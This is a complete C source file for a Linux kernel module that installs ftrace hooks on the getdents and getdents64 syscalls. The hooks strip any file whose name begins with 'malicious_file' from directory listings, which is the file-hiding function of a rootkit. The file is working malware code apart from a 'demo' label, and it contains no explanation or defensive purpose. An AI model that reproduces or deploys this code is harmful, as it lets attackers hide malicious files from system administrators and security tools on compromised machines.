// lkmdemo.c
#include <linux/module.h>
#include <linux/init.h>
#include <linux/kernel.h>
#include <linux/slab.h>
#include <linux/dirent.h>
#include <linux/version.h>
#include "ftrace_helper.h" // Our new helper

#define MODULE_NAME "lkmdemo_ftrace"
#define FILENAME_PREFIX "malicious_file"

// Manually define this as it can be hidden in modern headers
struct linux_dirent {
    unsigned long  d_ino;
    unsigned long  d_off;
    unsigned short d_reclen;
    char           d_name[];
};

// Define the function pointers for the original syscalls
static asmlinkage long (*orig_getdents64)(const struct pt_regs *);
static asmlinkage long (*orig_getdents)(const struct pt_regs *);

// Our new hook for getdents64
static asmlinkage int hook_getdents64(const struct pt_regs *regs) {
    long ret = orig_getdents64(regs);
    struct linux_dirent64 __user *dirent = (struct linux_dirent64 __user *)regs->si;
    char *kbuf;
    char *new_kbuf;
    long bpos, new_bpos = 0;
    struct linux_dirent64 *d;

    if (ret <= 0) return ret;
    kbuf = kzalloc(ret, GFP_KERNEL);
    if (!kbuf) return ret;
    if (copy_from_user(kbuf, dirent, ret)) { kfree(kbuf); return ret; }
    new_kbuf = kzalloc(ret, GFP_KERNEL);
    if (!new_kbuf) { kfree(kbuf); return ret; }

    for (bpos = 0; bpos < ret; bpos += d->d_reclen) {
        d = (struct linux_dirent64 *)(kbuf + bpos);
        if (strncmp(d->d_name, FILENAME_PREFIX, strlen(FILENAME_PREFIX)) != 0) {
            memcpy(new_kbuf + new_bpos, d, d->d_reclen);
            new_bpos += d->d_reclen;
        }
    }
    if (copy_to_user(dirent, new_kbuf, new_bpos)) pr_warn("ftrace: copy_to_user failed (64)\n");
    kfree(kbuf);
    kfree(new_kbuf);
    
    return new_bpos;
}

// Our new hook for getdents
static asmlinkage int hook_getdents(const struct pt_regs *regs) {
    long ret = orig_getdents(regs);
    struct linux_dirent __user *dirent = (struct linux_dirent __user *)regs->si;
    char *kbuf;
    char *new_kbuf;
    long bpos, new_bpos = 0;
    struct linux_dirent *d;

    if (ret <= 0) return ret;
    kbuf = kzalloc(ret, GFP_KERNEL);
    if (!kbuf) return ret;
    if (copy_from_user(kbuf, dirent, ret)) { kfree(kbuf); return ret; }
    new_kbuf = kzalloc(ret, GFP_KERNEL);
    if (!new_kbuf) { kfree(kbuf); return ret; }
    
    for (bpos = 0; bpos < ret; bpos += d->d_reclen) {
        d = (struct linux_dirent *)(kbuf + bpos);
        if (strncmp(d->d_name, FILENAME_PREFIX, strlen(FILENAME_PREFIX)) != 0) {
            memcpy(new_kbuf + new_bpos, d, d->d_reclen);
            new_bpos += d->d_reclen;
        }
    }
    if (copy_to_user(dirent, new_kbuf, new_bpos)) pr_warn("ftrace: copy_to_user failed (32)\n");
    kfree(kbuf);
    kfree(new_kbuf);

    return new_bpos;
}

// Array of hooks we want to install
static struct ftrace_hook hooks[] = {
    HOOK("__x64_sys_getdents64", hook_getdents64, &orig_getdents64),
    HOOK("__x64_sys_getdents", hook_getdents, &orig_getdents),
};

static int __init lkmdemo_init(void) {
    int err = fh_install_hooks(hooks, ARRAY_SIZE(hooks));
    if (err) return err;
    pr_info("%s: Ftrace hooks installed.\n", MODULE_NAME);
    return 0;
}

static void __exit lkmdemo_cleanup(void) {
    fh_remove_hooks(hooks, ARRAY_SIZE(hooks));
    pr_info("%s: Ftrace hooks removed.\n", MODULE_NAME);
}

module_init(lkmdemo_init);
module_exit(lkmdemo_cleanup);
MODULE_LICENSE("GPL");
MODULE_AUTHOR("Ftrace Demo");
